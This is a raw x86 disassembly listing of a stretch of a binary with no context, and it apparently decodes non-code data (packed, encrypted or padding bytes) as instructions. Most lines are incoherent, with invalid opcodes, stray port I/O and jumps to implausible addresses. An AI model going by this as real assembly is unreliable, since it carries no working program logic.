  4183a7:	add    BYTE PTR [edx+0x726607],dl
	...
  4183b9:	add    BYTE PTR [eax],al
  4183bb:	xchg   ebx,eax
  4183bc:	push   0x6e
  4183be:	fs jp  0x418429
  4183c1:	imul   esp,DWORD PTR [edx+edi*2+0x6b],0x61
  4183c6:	jae    0x4183c6
  4183c8:	aas    
  4183c9:	outs   dx,BYTE PTR ds:[esi]
  4183ca:	jns    0x418416
  4183cc:	inc    ecx
  4183cd:	imul   ebp,DWORD PTR [esi-0x21],0x6
  4183d1:	imul   ebp,DWORD PTR [ecx-0x27],0xd5736b54
  4183d8:	push   0x14f80074
  4183dd:	xor    dh,BYTE PTR [edx]
  4183df:	call   0xafa383f8
  4183e4:	bound  ebp,QWORD PTR fs:[edi+ebp*4+0x5a]
  4183e9:	add    BYTE PTR [ecx],dh
  4183eb:	jnp    0x418405
  4183ed:	sub    eax,0x2d186b31
  4183f2:	add    BYTE PTR [ecx-0x569ea0c2],bl
  4183f8:	ds ins BYTE PTR es:[edi],dx
  4183fa:	popa   
  4183fb:	or     al,BYTE PTR [ecx+0x6b]
  4183fe:	jb     0x41839e
  418400:	push   0x6e9326e
  418405:	gs ins BYTE PTR es:[edi],dx
  418407:	jne    0x418460
  418409:	popa   
  41840a:	gs add BYTE PTR gs:[bp+0x65],ah
  418410:	ds je  0x418475
  418413:	pop    ebx
  418414:	cmp    eax,0x3aca316c
  418419:	imul   esi,DWORD PTR [esi+0x53],0x3f
  41841d:	arpl   WORD PTR [eax],ax
	...
  41842b:	add    BYTE PTR [eax],al
  41842d:	add    BYTE PTR [eax+ebp*2+0x74],ah
  418431:	push   0x65003f5b
  418436:	mov    bh,0x3d
  418438:	pop    ebp
  418439:	outs   dx,BYTE PTR ds:[esi]
  41843a:	scas   eax,DWORD PTR es:[edi]
  41843b:	gs ins BYTE PTR es:[edi],dx
  41843d:	add    BYTE PTR [ebx-0x41],ah
  418440:	ins    WORD PTR es:[edi],dx
  418442:	hlt    
  418443:	int    0x6c
  418445:	add    BYTE PTR ds:0x46966a1,al
  41844b:	retf   0x5f
  41844e:	lock int3 
  418450:	pop    eax
  418451:	imul   ebp,edx,0xffffffeb
  418454:	pop    eax
  418455:	pop    edi
  418456:	fild   DWORD PTR [ebx-0x133893a0]
  41845c:	pop    ebx
  41845d:	pop    edi
  41845e:	ror    BYTE PTR [ebx+0x63b90057],1
  418464:	pop    ecx
  418465:	outs   dx,BYTE PTR ds:[esi]
  418466:	arpl   WORD PTR [ebp-0x6053cd8c],bx
  41846c:	pusha  
  41846d:	xor    al,0xb1
  41846f:	in     al,dx
  418470:	arpl   WORD PTR [edi-0x3f],bx
  418473:	push   ebp
  418474:	add    DWORD PTR [edx-0x7a],esi
  418477:	push   eax
  418478:	xor    esi,DWORD PTR [edx]
  41847a:	push   eax
  41847b:	in     al,dx
  41847c:	arpl   WORD PTR [edx+eax*4+0x4e],bp
  418480:	pop    eax
  418481:	pop    edi
  418482:	arpl   WORD PTR [esi+esi*2],di
  418485:	lea    ecx,[bx+0x5f]
  418489:	add    BYTE PTR [edx+0x1b],dh
  41848c:	pop    edi
  41848d:	jb     0x418506
  41848f:	in     al,dx
  418490:	pushw  0x0
	...
  4184a0:	add    BYTE PTR [esi+0x20],bh
  4184a3:	jne    0x418508
  4184a5:	inc    edx
  4184a6:	in     al,dx
  4184a7:	xor    BYTE PTR [ebx],dh
  4184a9:	mov    ?,WORD PTR [ecx+0xa420030]
  4184af:	popa   
  4184b0:	arpl   WORD PTR [edi],si
  4184b2:	mov    ebp,0xde426801
  4184b7:	pop    ebp
  4184b8:	popa   
  4184b9:	inc    esp
  4184ba:	fisub  WORD PTR [eax+0x0]
  4184bd:	inc    edi
  4184be:	adc    DWORD PTR [esp+esi*2+0x3e],ebp
  4184c2:	fiadd  WORD PTR [ecx]
  4184c4:	jno    0x4184c8
  4184c6:	add    eax,0x4ff60dd
  4184cb:	sbb    BYTE PTR ds:0x371a1751,dh
  4184d1:	arpl   WORD PTR [ebp-0x38],bp
  4184d4:	push   edi
  4184d5:	psrad  mm7,0x5d
  4184d9:	adc    al,0x56
  4184db:	mov    bh,0x60
  4184dd:	icebp  
  4184de:	add    al,0xcb
  4184e0:	fs cmc 
  4184e2:	imul   eax,esp,0x57
  4184e5:	iret   
  4184e6:	push   0xffffffe7
  4184e8:	pop    esi
  4184e9:	mov    esp,0xbd609359
  4184ee:	add    eax,0x54d2648a
  4184f3:	and    BYTE PTR [eax+0x63],0x54
  4184f7:	jnp    0x418559
  4184f9:	(bad)  
  4184fa:	jno    0x418484
  4184fc:	add    esi,DWORD PTR [ebx-0x3f9377ad]
  418502:	push   ebx
  418503:	out    0x5b,eax
	...
  418511:	add    BYTE PTR [eax],al
  418513:	add    BYTE PTR [esi+0x7e594b59],cl
  418519:	add    eax,0x697d5b56
  41851e:	inc    esi
  41851f:	jno    0x4184b3
  418521:	add    eax,0x59726f3c
  418526:	dec    ebx
  418527:	pop    ebx
  418528:	add    BYTE PTR ds:0x6a776346,0x3a
  41852f:	add    al,0x81
  418531:	outs   dx,BYTE PTR ds:[esi]
  418532:	cmp    ebx,DWORD PTR [eax+0x46]
  418535:	sbb    bx,WORD PTR [edi+0x52]
  418539:	add    eax,0x69415c06
  41853e:	sbb    ebx,DWORD PTR [edx+0x63]
  418541:	push   0x6c495c05
  418546:	adc    al,0x4
  418548:	test   BYTE PTR [ebx],dl
  41854a:	mov    edx,0x17702f
  41854f:	mov    esi,0xe9301878
  418554:	pusha  
  418555:	fs je  0x41853a
  418558:	push   cs
  418559:	push   edi
  41855a:	imul   ecx,esi,0xdc756f16
  418560:	pusha  
  418561:	ins    DWORD PTR es:[edi],dx
  418562:	je     0x418539
  418564:	lock sbb ch,BYTE PTR ds:0x2e304816
  41856b:	clc    
  41856c:	xor    BYTE PTR ss:[esi],ch
  41856f:	lock das 
  418571:	das    
  418572:	das    
  418573:	test   BYTE PTR [eax+0xd9381b],0x0
	...
  418586:	add    BYTE PTR [eax-0x5466d2eb],cl
  41858c:	outs   dx,DWORD PTR ds:[esi]
  41858d:	ja     0x418555
  41858f:	ret    
  418590:	inc    eax
  418591:	je     0x418517
  418593:	pop    edx
  418594:	push   ebp
  418595:	push   0x746d6079
  41859a:	jne    0x41854c
  41859c:	sbb    ebp,DWORD PTR ds:0x7254c1c6
  4185a2:	add    BYTE PTR [ecx-0x7fb29c91],0x6c
  4185a9:	arpl   WORD PTR [ebx+0x69],sp
  4185ac:	addr16 jb 0x4185c2
  4185af:	aaa    
  4185b0:	adc    eax,0x555a1938
  4185b5:	ins    DWORD PTR es:[edi],dx
  4185b6:	push   edi
  4185b7:	mov    BYTE PTR [edx],dh
  4185b9:	gs dec eax
  4185bb:	jae    0x418621
  4185bd:	cmp    DWORD PTR cs:[edi+0x38e90055],eax
  4185c4:	pop    ecx
  4185c5:	je     0x4185e0
  4185c7:	test   DWORD PTR [edx],esi
  4185c9:	sub    eax,0x67552e08
  4185ce:	pop    es
  4185cf:	inc    eax
  4185d0:	push   ebx
  4185d1:	ins    BYTE PTR es:[edi],dx
  4185d2:	(bad)  
  4185d3:	push   ds
  4185d4:	push   0x3ab60071
  4185d9:	addr16 cs pop esp
  4185dc:	inc    eax
  4185dd:	je     0x41860e
  4185df:	pop    edi
  4185e0:	cmp    BYTE PTR [edi],ch
  4185e2:	gs jg  0x418619
  4185e5:	bound  edi,QWORD PTR [edx+0x6d]
  4185e8:	dec    edx
  4185e9:	imul   esp,DWORD PTR [edx+0x0],0x0
	...
  4185f8:	add    BYTE PTR [eax],al
  4185fa:	lahf   
  4185fb:	std    
  4185fc:	pusha  
  4185fd:	js     0x418596
  4185ff:	add    ebp,DWORD PTR [eax+0x74]
  418602:	xchg   esi,eax
  418603:	push   ebx
  418604:	cmp    ch,BYTE PTR [edi]
  418606:	dec    ebp
  418607:	push   edi
  418608:	js     0x41866e
  41860a:	test   al,0x62
  41860c:	jae    0x418673
  41860e:	test   al,0xfd
  418610:	pop    esi
  418611:	outs   dx,DWORD PTR ds:[esi]
  418612:	pop    ds
  418613:	inc    BYTE PTR [edx+0x4b]
  418616:	out    0x4b,al
  418618:	inc    ebx
  418619:	inc    esp
  41861a:	pop    ss
  41861b:	outs   dx,DWORD PTR ds:[esi]
  41861c:	sub    edx,DWORD PTR [ecx+ecx*1+0x1d]
  418620:	fs inc edx
  418622:	adc    eax,DWORD PTR [ebp+0x2e]
  418625:	gs loop 0x418667
  418628:	add    BYTE PTR [eax],al
  41862a:	add    edx,DWORD PTR [eax+0x45]
  41862d:	push   eax
  41862e:	lds    ebx,FWORD PTR [esi]
  418630:	inc    esi
  418631:	dec    ecx
  418632:	(bad)  
  418633:	pop    ds
  418634:	xor    BYTE PTR [ecx+0x57],bl
  418637:	and    BYTE PTR [eax+0x4b],dl
  41863a:	inc    esi
  41863b:	pop    ds
  41863c:	inc    ebp
  41863d:	dec    esp
  41863e:	aaa    
  41863f:	sbb    DWORD PTR [ebp+0x55],edx
  418642:	inc    ebx
  418643:	inc    edx
  418644:	push   edx
  418645:	pop    ecx
  418646:	pop    edx
  418647:	xor    eax,0x51ea4441
  41864c:	push   ecx
  41864d:	dec    ecx
  41864e:	jmp    0x418648
  418650:	das    
  418651:	add    dl,cl
  418653:	add    al,BYTE PTR [eax]
  418655:	add    al,cl
  418657:	add    cl,BYTE PTR [ecx+0x4f]
  41865a:	xchg   BYTE PTR [edi*8+0x0],dh
	...
  41866d:	arpl   sp,bp
  41866f:	add    DWORD PTR [eax],eax
  418671:	arpl   sp,bp
  418673:	add    DWORD PTR [eax],eax
  418675:	arpl   bx,di
  418677:	xor    al,0x46
  418679:	pop    ss
  41867a:	test   DWORD PTR [edx+0x52],0x6736f81e
  418681:	add    dl,bl
  418683:	push   esi
  418684:	jno    0x41868a
  418686:	into   
  418687:	ins    DWORD PTR es:[edi],dx
  418688:	pop    esp
  418689:	xor    al,0xb5
  41868b:	push   ebx
  41868c:	fs hlt 
  41868e:	mov    esi,0xb9205c72
  418693:	outs   dx,DWORD PTR ds:[esi]
  418694:	jb     0x418694
  418696:	mov    ch,0x6d
  418698:	push   esi
  418699:	push   es
  41869a:	call   0x5345:0xc5f46772
  4186a1:	int    0xc5
  4186a3:	push   ebx
  4186a4:	jno    0x418675
  4186a6:	lea    edx,[ebp+0x6c]
  4186a9:	arpl   WORD PTR [ecx+0x7bb56753],bx
  4186af:	ins    DWORD PTR es:[edi],dx
  4186b0:	pop    edi
  4186b1:	iret   
  4186b2:	pusha  
  4186b3:	push   edx
  4186b4:	je     0x418667
  4186b6:	jne    0x41870b
  4186b8:	arpl   WORD PTR gs:[eax-0x774c8ea4],bp
  4186bf:	fs ja  0x41866f
  4186c2:	lea    ebx,[eax+0x63]
  4186c5:	arpl   WORD PTR [eax+0x4],cx
  4186c8:	add    BYTE PTR [ebx-0x14],ah
  4186cb:	add    DWORD PTR [eax],eax
  4186cd:	arpl   sp,bp
  4186cf:	add    DWORD PTR [ecx+0x0],ebp
	...
  4186de:	add    BYTE PTR [eax],al
  4186e0:	xchg   BYTE PTR [edx],bh
  4186e2:	push   esi
  4186e3:	arpl   WORD PTR [edi-0x78d1d025],ax
  4186e9:	push   eax
  4186ea:	pop    eax
  4186eb:	add    BYTE PTR [eax+eax*1+0x18464551],cl
  4186f2:	inc    ebx
  4186f3:	popa   
  4186f4:	dec    edi
  4186f5:	add    eax,0x42406e10
  4186fa:	push   cs
  4186fb:	push   esi
  4186fc:	push   edx
  4186fd:	outs   dx,BYTE PTR ds:[esi]
  4186fe:	add    esp,DWORD PTR [ecx+0x12]
  418701:	push   0x6e3c731a
  418706:	adc    eax,0x1705473d
  41870b:	jb     0x418743
  41870d:	bound  ecx,QWORD PTR [ebx+esi*2]
  418710:	adc    cl,BYTE PTR [ebx+eax*1+0x50]
  418714:	push   es
  418715:	xor    cl,ah
  418717:	jb     0x41872b
  418719:	ins    BYTE PTR es:[edi],dx
  41871a:	into   
  41871b:	push   ebp
  41871c:	sbb    al,0x69
  41871e:	out    0x3,eax
  418720:	arpl   WORD PTR ds:0x56303e7,ax
  418726:	out    0x3,eax
  418728:	add    dl,BYTE PTR [ebx-0x40]
  41872b:	jae    0x41871c
  41872d:	adc    ecx,edi
  41872f:	adc    eax,0x3bb69c7
  418734:	mov    ds:0xd773a057,al
  418739:	xor    cl,BYTE PTR [ebp-0x64932e8d]
  41873f:	pusha  
  418740:	ret    0xa351
  418743:	add    BYTE PTR fs:[eax],al
	...
  418752:	add    BYTE PTR [edi+0x6303e766],ch
  418758:	add    eax,0x5dc015e7
  41875d:	mov    WORD PTR [ebx],es
  41875f:	mov    dl,0x6c
  418761:	test   DWORD PTR [edi-0x72],ebp
  418764:	pop    cx
  418766:	pop    edi
  418767:	scas   eax,DWORD PTR es:[edi]
  418768:	xor    al,0x50
  41876a:	push   esi
  41876b:	mov    cl,0x46
  41876d:	cmp    DWORD PTR [esi+ecx*4],eax
  418770:	push   ebp
  418771:	inc    esp
  418772:	push   esi
  418773:	arpl   WORD PTR [esi],ax
  418775:	out    0x3,eax
  418777:	jecxz  0x4187d1
  418779:	dec    edi
  41877a:	pop    edi
  41877b:	ja     0x4187e6
  41877d:	add    dl,bh
  41877f:	xchg   edx,eax
  418780:	sub    esp,DWORD PTR [ebp+edi*1+0x3b]
  418784:	add    eax,0x688e3151
  418789:	je     0x4187b2
  41878b:	imul   esp,DWORD PTR cs:[esp+ecx*1+0x31],0x17155f35
  418794:	sbb    al,0x0
  418796:	jmp    0xe9418cfb
  41879b:	and    eax,0xeae93f24
  4187a0:	and    al,0x3f
  4187a2:	jmp    0xe980aca1
  4187a7:	mov    al,ds:0xcee93f24
  4187ac:	and    al,0x3f
  4187ae:	jmp    0xe980ac59
  4187b3:	mov    fs,WORD PTR [edi+edi*1]
  4187b6:	jmp    0x4187bb
	...
  4187c3:	add    BYTE PTR [eax],al
  4187c5:	add    BYTE PTR [ebx+0x2f],ah
  4187c8:	aas    
  4187c9:	jmp    0xe980b728
  4187ce:	jbe    0x4187ff
  4187d0:	aas    
  4187d1:	jmp    0xe980b76d
  4187d6:	stos   DWORD PTR es:[edi],eax
  4187d7:	das    
  4187d8:	aas    
  4187d9:	jmp    0xe980b7a6
  4187de:	pusha  
  4187df:	add    eax,0x561e900
  4187e4:	add    BYTE PTR [ecx+0x2c],ch
  4187e7:	fdiv   st(5),st
  4187e9:	jmp    0xad61dc5b
  4187ee:	mov    bh,0x66
  4187f0:	jae    0x41886e
  4187f2:	mov    ch,0x6b
  4187f4:	je     0x418850
  4187f6:	addr16 fdiv st(5),st
  4187f9:	jmp    0xe94186de
  4187fe:	pusha  
  4187ff:	sbb    al,0x70
  418801:	pop    ecx
  418802:	mov    ds:0x9b00743c,eax
  418807:	add    ebp,edi
  418809:	(bad)  
  41880a:	cli    
  41880b:	xchg   DWORD PTR [eax+eax*1],ebx
  41880e:	retf   0x4c07
  418811:	outs   dx,DWORD PTR ds:[esi]
  418812:	sub    DWORD PTR [eax+0x6c],ebp
  418815:	and    BYTE PTR [ebx+0x51],bh
  418818:	jo     0x41885e
  41881a:	pop    ebx
  41881b:	push   ebp
  41881c:	pop    ebp
  41881d:	add    bl,cl
  41881f:	pop    es
  418820:	add    BYTE PTR [eax+0x7aa],al
  418826:	jns    0x418890
  418828:	pop    edi
  418829:	push   0x0
	...
  418836:	add    BYTE PTR [eax],al
  418838:	add    BYTE PTR [edi+0x1],bl
  41883b:	std    
  41883c:	dec    DWORD PTR [edx-0x75ffe279]
  418842:	pop    es
  418843:	aas    
  418844:	outs   dx,DWORD PTR ds:[esi]
  418845:	mov    ch,0x3c
  418847:	gs gs test eax,0x8afffd07
  41884e:	xchg   DWORD PTR [edx],esp
  418850:	add    BYTE PTR [edx-0x5696b7f9],cl
  418856:	imul   ebp,DWORD PTR [ebx+0x72],0xffffffa3
  41885a:	pop    es
  41885b:	add    al,BYTE PTR [eax]
  41885d:	dec    edx
  41885e:	xchg   DWORD PTR [ecx],eax
  418860:	add    BYTE PTR [edx+0x7],cl
  418863:	dec    ecx
  418864:	jns    0x418880
  418866:	sbb    ebp,DWORD PTR [ebx+0x63]
  418869:	out    dx,eax
  41886a:	xor    esp,DWORD PTR [ecx+0x6e]
  41886d:	ficom  WORD PTR [ebp+0x0]
  418870:	add    cl,BYTE PTR [edx+0x7]
  418873:	and    BYTE PTR [ebx],0x3a
  418876:	pop    es
  418877:	add    BYTE PTR [ebx-0x2b],al
  41887a:	xor    ebp,DWORD PTR [ecx+0x6f]
  41887d:	in     al,0x26
  41887f:	cmp    eax,0x5d1a9a70
  418884:	je     0x418821
  418886:	add    ebp,edi
  418888:	(bad)  
  418889:	cli    
  41888a:	xchg   BYTE PTR [ebx],ah
  41888c:	add    BYTE PTR [ebx-0x14],ah
  41888f:	add    DWORD PTR [ebx+0x7a],ecx
  418892:	or     al,0x34
  418894:	sbb    BYTE PTR [bx+si],0x57
  418898:	jb     0x418918
  41889a:	pop    ds
  41889b:	add    al,0x2
	...
  4188a9:	add    BYTE PTR [eax],al
  4188ab:	add    BYTE PTR [ebx-0x14],ah
  4188ae:	sub    DWORD PTR [esi],0x4101ec63
  4188b4:	cmp    al,0xf1
  4188b6:	outs   dx,BYTE PTR ds:[esi]
  4188b7:	ins    DWORD PTR es:[edi],dx
  4188b8:	xor    eax,0x406d45cc
  4188bd:	stc    
  4188be:	outs   dx,BYTE PTR ds:[esi]
  4188bf:	arpl   WORD PTR [ebp-0x10],ax
  4188c2:	push   esp
  4188c3:	add    BYTE PTR [ecx-0x14],ah
  4188c6:	add    DWORD PTR [eax+0x1ec74],eax
  4188cc:	and    BYTE PTR [ebx],al
  4188ce:	outs   dx,DWORD PTR ds:[esi]
  4188cf:	imul   eax,DWORD PTR [edx+ebx*8],0x21
  4188d3:	aas    
  4188d4:	pop    es
  4188d5:	mov    cl,0x6c
  4188d7:	outs   dx,BYTE PTR ds:[esi]
  4188d8:	cli    
  4188d9:	mov    esi,0xb8027255
  4188de:	ins    BYTE PTR es:[edi],dx
  4188df:	jbe    0x4188df
  4188e1:	or     edi,DWORD PTR [eax]
  4188e3:	ins    DWORD PTR es:[edi],dx
  4188e4:	cld    
  4188e5:	scas   eax,DWORD PTR es:[edi]
  4188e6:	push   esi
  4188e7:	add    BYTE PTR [edx-0x14],ah
  4188ea:	add    DWORD PTR [eax+0x1ec93],eax
  4188f0:	mov    ds:0xbd6770c0,al
  4188f5:	jne    0x41894d
  4188f7:	je     0x4188ca
  4188f9:	lea    edx,[ebp+0x67]
  4188fc:	mov    ch,0x89
  4188fe:	and    DWORD PTR [esp+eax*8+0x5b],edx
  418902:	ins    DWORD PTR es:[edi],dx
  418903:	jno    0x418968
  418905:	in     eax,dx
  418906:	add    DWORD PTR [eax],eax
  418908:	jecxz  0x4188ea
  41890a:	add    DWORD PTR [eax],eax
  41890c:	arpl   WORD PTR [eax+ebp*2+0x72],di
	...
  41891c:	add    BYTE PTR [eax],al
  41891e:	add    BYTE PTR [eax+0x7f5f6f5b],dl
  418924:	add    eax,0x637636e7
  418929:	push   ebx
  41892a:	pop    ebx
  41892b:	pushf  
  41892c:	push   edi
  41892d:	dec    esp
  41892e:	inc    eax
  41892f:	test   al,0x6c
  418931:	dec    edx
  418932:	push   esi
  418933:	jle    0x41898b
  418935:	push   esi
  418936:	push   0x6f
  418938:	cmp    DWORD PTR [esi],edx
  41893a:	ins    DWORD PTR es:[edi],dx
  41893b:	dec    ebp
  41893c:	popa   
  41893d:	inc    esi
  41893e:	pop    ebx
  41893f:	push   edx
  418940:	cmp    DWORD PTR [edx],ebp
  418942:	pop    ecx
  418943:	push   ecx
  418944:	push   edi
  418945:	or     al,0x72
  418947:	dec    edi
  418948:	xor    eax,DWORD PTR [esi+edx*2]
  41894b:	xor    ch,BYTE PTR [esi+eax*1+0x72]
  41894f:	pop    ss
  418950:	inc    eax
  418951:	andps  xmm7,XMMWORD PTR [edi]
  418954:	push   0xfffffff9
  418956:	push   0x6c1a3931
  41895b:	add    BYTE PTR [ecx+0x3],ch
  41895e:	and    al,0x1d
  418960:	push   0xfffffffb
  418962:	add    BYTE PTR [bx-0x26],dl
  418966:	add    esi,DWORD PTR [ebx]
  418968:	dec    edx
  418969:	mov    edx,0xda204337
  41896e:	and    ebp,DWORD PTR [ebx]
  418970:	xor    DWORD PTR [ebx+0x15143e33],esi
  418976:	adc    al,0x58
  418978:	imul   esi,DWORD PTR [edx-0x2e]
  41897c:	push   ecx
  41897d:	icebp  
  41897e:	and    eax,DWORD PTR [eax+0xddc54]
	...
  418990:	add    BYTE PTR [eax],al
  418992:	mov    WORD PTR [edx+ecx*4+0x68],fs
  418996:	rcl    DWORD PTR [ecx-0x1f],cl
  418999:	and    ecx,DWORD PTR [ecx+0x6910c128]
  41899f:	inc    esi
  4189a0:	mov    ah,BYTE PTR [esi-0x40]
  4189a3:	push   ebp
  4189a4:	jnp    0x4189d6
  4189a6:	mov    al,ds:0x87728a67
  4189ab:	outs   dx,BYTE PTR ds:[esi]
  4189ac:	add    BYTE PTR [edi-0x7fdfe477],al
  4189b2:	test   BYTE PTR [esi+ebp*2+0x5d],ah
  4189b6:	js     0x418a09
  4189b8:	ja     0x4189c7
  4189ba:	inc    edi
  4189bb:	sub    edi,DWORD PTR [ecx]
  4189bd:	pop    eax
  4189be:	push   esp
  4189bf:	adc    eax,0x6aa7e30b
  4189c4:	outs   dx,BYTE PTR ds:[esi]
  4189c5:	cmp    eax,0xc74677c
  4189ca:	xor    esp,DWORD PTR [esi+ebp*2+0x4e]
  4189ce:	cmp    ebp,DWORD PTR [ebp+0x3a]
  4189d1:	or     DWORD PTR [ecx+ebp*2+0x4656f473],eax
  4189d8:	ins    DWORD PTR es:[edi],dx
  4189d9:	rdtsc  
  4189db:	fs popa 
  4189dd:	sbb    eax,0xd36e6a48
  4189e2:	and    BYTE PTR [esi+0x6c],0x16
  4189e6:	push   cs
  4189e7:	fs or  esi,ebx
  4189ea:	daa    
  4189eb:	push   0x6e
  4189ed:	std    
  4189ee:	std    
  4189ef:	data16 je 0x4189ae
  4189f2:	push   esp
  4189f3:	push   eax
  4189f4:	jo     0x4189c2
	...
  418a02:	add    BYTE PTR [eax],al
  418a04:	add    BYTE PTR [esi+0x25],ah
  418a07:	pop    edi
  418a08:	fst    DWORD PTR [eax]
  418a0a:	imul   esp,DWORD PTR [edi-0x36],0xbe675101
  418a11:	repnz sub DWORD PTR [ebp-0x36],ebp
  418a15:	or     al,0x64
  418a17:	je     0x418a25
  418a19:	mov    dh,0x51
  418a1b:	jb     0x4189e9
  418a1d:	shr    DWORD PTR [ebx+ecx*1-0x1d],0xa7
  418a22:	push   0x6e
  418a24:	popf   
  418a25:	mov    ebp,0xa5cc7467
  418a2a:	addr16 popa 
  418a2c:	xchg   BYTE PTR [eax+eiz*2+0x254e866e],bh
  418a33:	bound  eax,QWORD PTR [eax]
  418a35:	rcl    DWORD PTR [ebp+0x5d],cl
  418a38:	jb     0x418a1d
  418a3a:	push   es
  418a3b:	or     dl,BYTE PTR [ebp-0x67]
  418a3e:	pop    edi
  418a3f:	jb     0x418a6e
  418a41:	mov    ebx,0xa66e616c
  418a46:	neg    DWORD PTR [edi]
  418a48:	dec    ebp
  418a49:	lods   eax,DWORD PTR ds:[esi]
  418a4a:	aaa    
  418a4b:	gs ins BYTE PTR es:[edi],dx
  418a4d:	sahf   
  418a4e:	sub    esi,DWORD PTR fs:[esp+ebp*8]
  418a52:	repz pop ds
  418a54:	sub    BYTE PTR [ecx+0x2b706956],bl
  418a5a:	cmp    eax,0x601e6265
  418a5f:	aaa    
  418a60:	and    BYTE PTR [edi+0x12],ch
  418a63:	inc    ebp
  418a64:	inc    ebp
  418a65:	call   0x0:0x302dee
	...
  418a78:	shl    DWORD PTR [ebx],0x53
  418a7b:	imul   ebx,DWORD PTR [ebp+ebp*2+0x6b],0x35214977
  418a83:	cmp    BYTE PTR [ebx-0x6ff2f5fa],dl
  418a89:	add    edi,DWORD PTR [edi]
  418a8b:	outs   dx,DWORD PTR ds:[esi]
  418a8c:	pop    esp
  418a8d:	cmp    eax,0x26966e61
  418a92:	dec    esp
  418a93:	lods   al,BYTE PTR gs:[esi]
  418a95:	ins    BYTE PTR es:[edi],dx
  418a96:	je     0x418b00
  418a98:	inc    eax
  418a99:	add    DWORD PTR [edi+ebp*2-0x57],ecx
  418a9d:	bound  esi,QWORD PTR [ecx+ebp*2-0x53]
  418aa1:	push   ebp
  418aa2:	cmp    al,BYTE PTR [eax]
  418aa4:	mov    ch,0x3e
  418aa6:	push   esp
  418aa7:	and    BYTE PTR [edi+0x30],ah
  418aaa:	and    BYTE PTR [eax-0xa],cl
  418aad:	push   cs
  418aae:	push   eax
  418aaf:	das    
  418ab0:	dec    ebx
  418ab1:	adc    eax,0x4b500d30
  418ab6:	imul   esi,DWORD PTR [ebx-0x2a],0xfffffff8
  418aba:	pop    ds
  418abb:	and    eax,0xa0e7b63
  418ac0:	mov    ds:0xb363648b,al
  418ac5:	pop    eax
  418ac6:	sbb    esp,DWORD PTR [eax]
  418ac8:	dec    ecx
  418ac9:	(bad)  
  418aca:	sub    ecx,DWORD PTR [ebx]
  418acc:	imul   ebp,DWORD PTR [ebp+0x5c866164],0x2e9e2b55
  418ad6:	popa   
  418ad7:	ins    DWORD PTR es:[edi],dx
  418ad8:	xchg   DWORD PTR ds:0x656e,esi
	...
  418aea:	add    BYTE PTR [ecx],bh
  418aec:	or     al,0x6b
  418aee:	xchg   BYTE PTR fs:[esi],dl
  418af1:	pop    eax
  418af2:	outs   dx,DWORD PTR ds:[si]
  418af4:	inc    ebp
  418af5:	xor    BYTE PTR [eax],ah
  418af7:	mov    DWORD PTR [ebx],eax
  418af9:	push   ebx
  418afa:	cmp    edx,DWORD PTR [ebx+0x3c4107e1]
  418b00:	push   ss
  418b01:	outs   dx,BYTE PTR ds:[esi]
  418b02:	arpl   WORD PTR [eax-0x8],ax
  418b05:	push   0x6d
  418b07:	dec    ebp
  418b08:	loop   0x418b2b
  418b0a:	popa   
  418b0b:	inc    edi
  418b0c:	call   DWORD PTR [eax+0x63]
  418b0f:	pop    esi
  418b10:	loop   0x418b4a
  418b12:	jno    0x418b52
  418b14:	fidiv  DWORD PTR [eax]
  418b16:	aas    
  418b17:	add    al,0x1
  418b19:	outs   dx,BYTE PTR ds:[esi]
  418b1a:	je     0x418b75
  418b1c:	int3   
  418b1d:	push   eax
  418b1e:	ins    DWORD PTR es:[edi],dx
  418b1f:	or     DWORD PTR ds:0xef026c70,eax
  418b25:	pop    ss
  418b26:	xor    ecx,DWORD PTR cs:[esp+ebp*1]
  418b2a:	popa   
  418b2b:	add    al,0xc1
  418b2d:	push   ecx
  418b2e:	pop    edi
  418b2f:	test   esp,0x2fe6c5f
  418b35:	and    al,0x4b
  418b37:	mov    al,0x95
  418b39:	dec    eax
  418b3a:	and    BYTE PTR [esi-0x7cc6ec02],cl
  418b40:	outs   dx,DWORD PTR ds:[esi]
  418b41:	ins    BYTE PTR es:[edi],dx
  418b42:	outs   dx,BYTE PTR ds:[esi]
  418b43:	mov    edi,0xb2569605
  418b48:	and    eax,0x87c1be0
  418b4d:	loope  0x418b5f
	...
  418b5b:	add    BYTE PTR [eax],al
  418b5d:	add    BYTE PTR [ecx+0x5],bl
  418b60:	mov    ebp,0xe7277503
  418b65:	aas    
  418b66:	dec    ecx
  418b67:	daa    
  418b68:	rol    DWORD PTR [ebx],1
  418b6a:	dec    ecx
  418b6b:	daa    
  418b6c:	rol    DWORD PTR [ebx],0x7d
  418b6f:	pusha  
  418b70:	jae    0x418bd6
  418b72:	xchg   ebx,eax
  418b73:	ins    BYTE PTR es:[edi],dx
  418b74:	sbb    dl,BYTE PTR [edx]
  418b76:	dec    ebp
  418b77:	popa   
  418b78:	dec    ebx
  418b79:	jo     0x418bde
  418b7b:	inc    edi
  418b7c:	dec    esp
  418b7d:	pop    eax
  418b7e:	sub    al,0x55
  418b80:	inc    eax
  418b81:	inc    edx
  418b82:	jo     0x418be3
  418b84:	dec    ebp
  418b85:	imul   edx,DWORD PTR [ecx+0x3f],0x5406939
  418b8c:	and    eax,0x3a305769
  418b91:	imul   edx,DWORD PTR [ecx+0x40],0x5485915
  418b98:	out    0x6e,eax
  418b9a:	inc    edi
  418b9b:	pusha  
  418b9c:	ficom  DWORD PTR [ecx]
  418b9e:	jge    0x418c01
  418ba0:	sti    
  418ba1:	outs   dx,DWORD PTR ds:[esi]
  418ba2:	arpl   WORD PTR [edx],si
  418ba4:	sti    
  418ba5:	cs push bp
  418ba8:	add    al,0x6e
  418baa:	xor    dl,BYTE PTR [ecx+0x6]
  418bad:	push   edx
  418bae:	sub    al,0x5e
  418bb0:	add    al,0x4
  418bb2:	arpl   WORD PTR [ebx+ecx*8+0x55],sp
  418bb6:	sbb    al,0x55
  418bb8:	rcl    BYTE PTR [edx],1
  418bba:	xor    DWORD PTR [edi],esp
  418bbc:	retf   
  418bbd:	outs   dx,DWORD PTR ds:[esi]
  418bbe:	inc    DWORD PTR [eax+ebp*4]
  418bc1:	outs   dx,DWORD PTR ds:[esi]
	...
  418bce:	add    BYTE PTR [eax],al
  418bd0:	add    bh,dh
  418bd2:	gs retf 0xd764
  418bd6:	push   0xffffffa8
  418bd8:	ins    DWORD PTR es:[edi],dx
  418bd9:	mov    edi,0xbfc7003e
  418bde:	pop    ecx
  418bdf:	addr16 enter 0x6cb4,0x7a
  418be4:	mov    WORD PTR [ecx+0x6c],?
  418be7:	fs jmp 0x8aa4e98e
  418bed:	mov    ecx,0xbb826d39
  418bf2:	arpl   WORD PTR [ebx-0x74],cx
  418bf5:	xchg   ebx,eax
  418bf6:	arpl   WORD PTR [bp+di-0x4f],di
